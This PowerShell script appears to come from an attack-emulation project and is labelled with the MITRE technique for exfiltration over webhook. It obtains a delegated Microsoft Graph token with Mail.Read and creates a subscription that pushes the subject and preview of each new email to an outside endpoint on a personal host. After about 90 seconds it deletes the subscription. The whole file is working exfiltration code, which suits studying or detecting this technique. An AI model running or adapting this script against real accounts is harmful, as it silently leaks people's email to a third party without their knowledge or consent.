<#
.SYNOPSIS
Connect to Graph API and create a webhook for new incoming messages

.DESCRIPTION
TA0009/10: Collection & Exfiltration
T1567.004: Exfiltration over Web Service: Exfiltration over Webhook
1st attack method
#>

Get-Module | Where-Object name -eq readenv | Remove-Module
Import-Module ../APIs/readEnv.psm1
Get-Module | Where-Object name -eq custom | Remove-Module
Import-Module ../APIs/custom.psm1

# We use the ews environment variables
Import-Environment "graph.env"

Get-Module | Where-Object name -eq oauth-microsoft | Remove-Module
Import-Module ../APIs/oauth-microsoft.psm1
$scope = "Mail.Read"
if ($null -eq $accessToken) { $accessToken = Get-DelegatedAccessToken -tenantId $env:TENANT_ID -clientId $env:GRAPH_DELEGATE_CLIENT_ID -scope $scope -redirectUrl $env:GRAPH_DELEGATE_REDIRECT_URI }


# Create a subscription for email messages
$url = "https://graph.microsoft.com/v1.0/subscriptions"
$rand = Get-Random -Minimum 1000 -Maximum 9999

$certb64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Content ./cert.cer)))
$expiry = get-date -Format "yyyy-MM-dd\THH:mm:ss.0000000Z" -Date (Get-Date).AddHours(2)

$body = @{
  "changeType" = "created";
  "notificationUrl" = "https://rink.personal.gewis.nl/id-cpe/microsoftendpoint.php";
  "resource" = "/me/messages?`$select=subject,bodyPreview";
  "includeResourceData" = $True;
  "encryptionCertificate" = $certb64;
  "encryptionCertificateId" = "T1567.004-A1";
  "expirationDateTime" = $expiry;
}
$body = ConvertTo-Json -Depth 99 $body
$response = Invoke-RestMethod $url -Method Post -ContentType "application/json" -Headers @{"Authorization"="Bearer $accessToken"} -Body $body
$subscriptionId = $response.id


# Delete the subscription again
Wait-KeyOrTimeOut -Timeout 90000

$url = "$url/$subscriptionId"
Invoke-RestMethod $url -Method Delete -ContentType "application/json" -Headers @{"Authorization"="Bearer $accessToken"}
